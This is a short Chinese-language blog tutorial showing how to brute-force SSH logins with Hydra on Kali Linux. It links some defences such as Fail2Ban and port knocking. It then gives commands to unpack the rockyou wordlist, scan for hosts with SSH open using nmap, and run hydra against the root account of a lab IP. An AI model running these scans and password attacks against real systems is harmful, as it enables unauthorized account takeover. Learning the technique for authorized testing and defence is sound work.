---
layout: post
title: 使用Hydra通过ssh破解密码
---

Hydra是非常高效的网络登录破解工具，它可以对多种服务程序执行[暴力破解](http://topspeedsnail.com/hack-brute-force/)（SSH、VNC等等）。

防止这种攻击其实很容易，方法很多。以SSH为例：

* [Ubuntu：使用Port Knocking隐藏SSH端口](http://blog.topspeedsnail.com/archives/3936)
* [在Ubuntu中用Fail2Ban保护SSH](http://blog.topspeedsnail.com/archives/262)
* [CentOS 7安装使用Fail2Ban保护SSH](http://blog.topspeedsnail.com/archives/3119)
* [Debian使用Fail2Ban和Tinyhoneypot增加网络安全](http://blog.topspeedsnail.com/archives/3667)

*****

Kail Linux有一个的GUI版本：xhydra，也有一个命令行版本：hydra。

xhydra：

![xhydra]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-16 10-26-48.png)

hydra：

![hydra]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-16 10-28-41.png)

我使用命令行版本：hydra

### 字典

这种攻击需要字典文件，一个好的字典至关重要。我以Kali Linux自带的rockyou字典为例，位于/user/share/wordlists/rockyou.txt.gz。

使用前先解压：

{% highlight shell %}
# gzip -d /usr/share/wordlists/rockyou.txt.gz
{% endhighlight %}

### 使用nmap扫描开启SSH服务的主机

扫描SSH服务(22端口)，确定可以施行破解的主机。

{% highlight shell %}
＃ nmap -p 22 -open -sV one_IP_or_range_or_subnet > MyTarget
{% endhighlight %}

### 使用hydra暴力破解

{% highlight shell %}
# hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh
{% endhighlight %}

更多选项，查看man hydra。